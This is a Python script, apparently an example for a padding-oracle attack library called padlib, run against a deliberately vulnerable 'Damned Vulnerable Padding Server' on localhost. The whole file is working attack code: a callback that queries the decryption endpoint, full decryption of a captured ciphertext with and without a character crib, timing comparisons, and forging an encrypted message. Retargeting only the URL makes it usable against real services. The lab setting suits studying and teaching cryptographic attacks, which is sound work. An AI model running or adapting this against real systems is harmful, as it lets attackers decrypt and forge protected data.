#!/usr/bin/env python3
from padlib import PadLib
import requests

import time

VERBOSE = True

# simple callback function
# sends a suitably encoded request to the Damned Vulnerable Padding Server and returns True or False based on the result
# in a realistic scenario you may need to do more complex request creation and response parsing, retries, etc.
def callback(guess):
        r = requests.get(f'http://localhost:8080/decrypt-with-iv/{guess.hex()}')
        return r.status_code == 200

# a class for providing finite state machine (FSM) capability for crib generation
# this is the bare minimum functionality
# it must have a function called `get_crib` that takes one input (the last plaintext byte that was decrypted) and returns a crib as a list of ints (0..255)
# you can (and should) maintain state here and update the FSM when the data you're decrypting is heavily structured, e.g. JSON, XML, yaml, URL params etc.
class crib_wrapper(object):
        def __init__(self, crib):
                self._crib = [ord(ch) for ch in crib]
                self._state = None

        def get_crib(self, last_plaintext_byte):
                # 1. update the state based on the current state and the byte we just decrypted
                # 2. generate a new crib (list of ints ordered most likely -> least likely)
                #      note - you only need to include the values you care about - padlib will append any missing values to cover all eventualities
                # 3. return it to padlib
                return self._crib

r = requests.get('http://localhost:8080/encrypt-with-iv')
ciphertext = r.text

print(f'[+] Got ciphertext: {ciphertext}')
print('[+] Decrypting without crib...')

t0_no_crib = time.time_ns()
oracle = PadLib(bytes.fromhex(ciphertext), callback, verbose=VERBOSE)
result = oracle.decrypt()
t1_no_crib = time.time_ns()

print(result)
guesses_per_byte_no_crib = result['stats'] / len(result['plaintext'])
print()

print('[+] Decrypting with crib...')
t0_crib = time.time_ns()
crib_inst = crib_wrapper('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890 ')
oracle = PadLib(bytes.fromhex(ciphertext), callback, crib=crib_inst, verbose=VERBOSE)
result = oracle.decrypt()
t1_crib = time.time_ns()

print(result)
guesses_per_byte_crib = result['stats'] / len(result['plaintext'])
print()

no_crib = t1_no_crib - t0_no_crib
crib = t1_crib - t0_crib
delta = crib / no_crib * 100
print(f'[+] Crib took {delta:.1f}% of the time to decrypt vs without crib')
print(f'[+] Guesses per byte:\n    Without crib = {guesses_per_byte_no_crib:.1f}\n    With crib    = {guesses_per_byte_crib:.1f}')
print()

print('[+] Encrypting message: a test message!')
oracle = PadLib(bytes.fromhex(ciphertext), callback, verbose=VERBOSE)
result = oracle.encrypt('a test message!')
print(result)
